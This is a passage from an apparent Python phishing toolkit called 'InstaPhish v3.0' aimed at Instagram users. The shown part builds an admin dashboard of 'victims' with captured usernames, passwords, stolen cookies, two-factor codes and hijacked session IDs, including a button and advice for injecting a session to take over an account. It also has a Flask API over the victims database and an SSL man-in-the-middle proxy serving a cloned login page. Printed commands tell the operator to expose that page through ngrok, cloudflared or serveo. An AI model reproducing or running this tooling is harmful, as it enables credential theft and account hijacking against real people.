.cookie{color:var(--warning);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.actions button{background:var(--accent);color:white;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;margin:2px}
.actions button:hover{opacity:0.8}
.actions button.danger{background:var(--danger)}
.refresh{background:var(--accent);color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px}
.refresh:hover{opacity:0.8}
.tabs{display:flex;gap:0;margin-bottom:20px}
.tab{padding:10px 20px;background:var(--card);border:1px solid var(--border);color:var(--text);cursor:pointer;font-size:13px}
.tab.active{background:var(--accent);border-color:var(--accent)}
.tab-content{display:none}
.tab-content.active{display:block}
</style></head>
<body>
<div class="header">
<h1>⚡ InstaPhish v3.0</h1>
<div class="stats" id="stats">
<div class="stat-card"><div class="number" id="totalCaptures">0</div><div class="label">Total Captures</div></div>
<div class="stat-card"><div class="number" id="activeSessions">0</div><div class="label">Active Sessions</div></div>
<div class="stat-card"><div class="number" id="todayCaptures">0</div><div class="label">Today</div></div>
</div>
<button class="refresh" onclick="loadData()">↻ Refresh</button>
</div>

<div class="tabs">
<button class="tab active" onclick="showTab('credentials')">Credentials</button>
<button class="tab" onclick="showTab('sessions')">Active Sessions</button>
<button class="tab" onclick="showTab('cookies')">Cookies</button>
<button class="tab" onclick="showTab('intercepted')">Intercepted Data</button>
</div>

<div id="credentials" class="tab-content active">
<div class="sessions-table">
<h2>📧 Captured Credentials</h2>
<div style="overflow-x:auto">
<table><thead><tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th><th>Session</th><th>Actions</th></tr></thead>
<tbody id="credsBody"></tbody></table>
</div></div></div>

<div id="sessions" class="tab-content">
<div class="sessions-table">
<h2>🔑 Hijacked Sessions</h2>
<table><thead><tr><th>Time</th><th>Session ID</th><th>CSRF Token</th><th>Status</th><th>Actions</th></tr></thead>
<tbody id="sessionsBody"></tbody></table>
</div></div>

<div id="cookies" class="tab-content">
<div class="sessions-table">
<h2>🍪 Stolen Cookies</h2>
<table><thead><tr><th>Time</th><th>IP</th><th>Session ID</th><th>All Cookies</th></tr></thead>
<tbody id="cookiesBody"></tbody></table>
</div></div>

<div id="intercepted" class="tab-content">
<div class="sessions-table">
<h2>📡 Intercepted Data Stream</h2>
<table><thead><tr><th>Time</th><th>Type</th><th>Data</th><th>URL</th></tr></thead>
<tbody id="interceptedBody"></tbody></table>
</div></div>

<script>
function showTab(tabId) {
document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
document.getElementById(tabId).classList.add('active');
event.target.classList.add('active');
}
async function loadData(){
try{
let r=await fetch('/api/data');
let d=await r.json();
document.getElementById('totalCaptures').textContent=d.total;
document.getElementById('activeSessions').textContent=d.active_sessions;
document.getElementById('todayCaptures').textContent=d.today;
let creds='';
d.victims.forEach(v=>{
creds+=`<tr><td>${v.timestamp}</td><td>${v.ip}</td><td>${v.username||'-'}</td><td>${v.password||'-'}</td><td>${v.sessionid?'<span class="session-active">✓</span>':'<span class="session-expired">✗</span>'}</td>
<td class="actions"><button onclick="useSession('${v.sessionid}')">Use</button><button class="danger" onclick="deleteEntry(${v.id})">Del</button></td></tr>`;
});
document.getElementById('credsBody').innerHTML=creds;
let sess='';
d.sessions.forEach(s=>{
sess+=`<tr><td>${s.captured}</td><td class="cookie">${s.sessionid}</td><td>${s.csrftoken}</td><td><span class="${s.active?'session-active':'session-expired'}">${s.active?'Active':'Expired'}</span></td>
<td class="actions"><button onclick="copySession('${s.sessionid}','${s.csrftoken}')">Copy</button></td></tr>`;
});
document.getElementById('sessionsBody').innerHTML=sess;
let cooks='';
d.victims.forEach(v=>{
if(v.all_cookies)cooks+=`<tr><td>${v.timestamp}</td><td>${v.ip}</td><td class="cookie">${v.sessionid||'-'}</td><td class="cookie">${v.all_cookies.substring(0,100)}</td></tr>`;
});
document.getElementById('cookiesBody').innerHTML=cooks;
let inter='';
d.intercepted.forEach(i=>{
inter+=`<tr><td>${i.timestamp}</td><td>${i.type}</td><td>${i.data.substring(0,100)}</td><td>${i.url}</td></tr>`;
});
document.getElementById('interceptedBody').innerHTML=inter;
}catch(e){console.error(e);}
}
function useSession(sid){if(sid){navigator.clipboard.writeText(sid);alert('SessionID copied! Use Cookie Editor extension to inject.');}}
function copySession(sid,csrf){navigator.clipboard.writeText(JSON.stringify({sessionid:sid,csrftoken:csrf}));alert('Cookies copied!');}
function deleteEntry(id){fetch('/api/delete/'+id).then(()=>loadData());}
loadData();
setInterval(loadData,3000);
</script>
</body></html>"""
        
        with open("admin.html", "w") as f:
            f.write(admin_html)
        
        # Flask API server
        api_code = f"""
from flask import Flask, jsonify, send_file
import sqlite3, json
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return send_file('admin.html')

@app.route('/api/data')
def api_data():
    conn = sqlite3.connect('{CONFIG["db_file"]}')
    c = conn.cursor()
    
    c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 50')
    victims = [dict(zip(['id','timestamp','ip_address','user_agent','username','password',
                          'email','phone','sessionid','csrftoken','ds_user_id','rur','mid',
                          'ig_did','datr','all_cookies','two_factor_code','backup_codes',
                          'fingerprint','referer','geo_location','device_info','login_flow'], row)) for row in c.fetchall()]
    
    c.execute('SELECT * FROM active_sessions WHERE is_active=1 ORDER BY id DESC')
    sessions = [dict(zip(['id','victim_id','sessionid','csrftoken','captured_at','last_validated','is_active'], row)) for row in c.fetchall()]
    
    c.execute('SELECT * FROM intercepted_data ORDER BY id DESC LIMIT 50')
    intercepted = [dict(zip(['id','victim_id','data_type','data_content','url','timestamp'], row)) for row in c.fetchall()]
    
    c.execute('SELECT COUNT(*) FROM victims')
    total = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM victims WHERE date(timestamp)=date('now')")
    today = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({{
        'total': total,
        'today': today,
        'active_sessions': len(sessions),
        'victims': victims,
        'sessions': sessions,
        'intercepted': intercepted
    }})

@app.route('/api/delete/<int:id>')
def delete(id):
    conn = sqlite3.connect('{CONFIG["db_file"]}')
    c = conn.cursor()
    c.execute('DELETE FROM victims WHERE id=?', (id,))
    conn.commit()
    conn.close()
    return jsonify({{'status': 'ok'}})

app.run(host='0.0.0.0', port={CONFIG['admin_port']}, debug=False)
"""
        with open("api_server.py", "w") as f:
            f.write(api_code)
        
        threading.Thread(target=lambda: os.system("python3 api_server.py"), daemon=True).start()
        print(f"{Colors.BLUE}[+] Admin Panel: http://0.0.0.0:{CONFIG['admin_port']}{Colors.RESET}")

# ==================== SSL MITM PROXY ====================
class MITMProxy:
    @staticmethod
    def start():
        """Start HTTPS server with MITM capabilities"""
        server = socketserver.ThreadingTCPServer(
            (CONFIG["listen_host"], CONFIG["listen_port"]),
            InstagramMITMHandler
        )
        
        # Wrap with SSL
        if os.path.exists(CONFIG["ssl_cert"]) and os.path.exists(CONFIG["ssl_key"]):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(CONFIG["ssl_cert"], CONFIG["ssl_key"])
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
            print(f"{Colors.GREEN}[+] SSL/TLS enabled{Colors.RESET}")
        
        print(f"""
{Colors.CYAN}╔════════════════════════════════════════════════════╗
║  {Colors.WHITE}Phishing URL: {Colors.YELLOW}https://127.0.0.1:{CONFIG['listen_port']}{Colors.CYAN}        ║
║  {Colors.WHITE}Admin Panel: {Colors.YELLOW}http://127.0.0.1:{CONFIG['admin_port']}{Colors.CYAN}             ║
║  {Colors.WHITE}Logs: {Colors.YELLOW}{CONFIG['log_file']}{Colors.CYAN}                    ║
║  {Colors.WHITE}Cookies: {Colors.YELLOW}{CONFIG['cookie_file']}{Colors.CYAN}                ║
╚════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.RED}[*] Expose to internet:{Colors.RESET}
    {Colors.YELLOW}ngrok http {CONFIG['listen_port']}{Colors.RESET}
    {Colors.YELLOW}cloudflared tunnel --url https://localhost:{CONFIG['listen_port']}{Colors.RESET}
    {Colors.YELLOW}ssh -R 80:localhost:{CONFIG['listen_port']} serveo.net{Colors.RESET}
""")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Shutting down...{Colors.RESET}")
            server.shutdown()

# ==================== MAIN ====================
def main():
    print_banner()
    
    # Setup
    Setup.create_directories()
    Setup.generate_ssl_cert()
    Setup.create_user_agents()
    Setup.init_database()
    
    # Clone Instagram
    InstagramCloner.clone_login_page()
    
    # Start Admin Panel
    AdminPanel.start()
    
    # Start MITM Proxy
    MITMProxy.start()

if __name__ == "__main__":
    main()
